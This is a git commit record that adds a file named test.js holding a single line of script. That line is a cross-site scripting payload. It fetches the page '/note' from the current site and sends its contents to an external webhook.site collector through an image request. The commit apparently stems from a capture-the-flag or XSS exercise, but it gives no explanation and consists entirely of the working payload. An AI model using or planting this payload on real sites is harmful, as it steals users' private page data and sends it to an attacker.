334d32733e35a9bb33b9c2c1ba5496520e75be5e
huyyenbang <34955676+huyyenbang@users.noreply.github.com>
2025-08-11 19:09:08 +0700

    Create test.js

---
+++ test.js
@@ -0,0 +1,1 @@
+<script>fetch('/note').then(response => {return response.text();}).then(data => {new Image().src = 'https://webhook.site/1cfe66a9-774b-48f4-9c70-4dd50709445f/?aa=' + data});</script>     
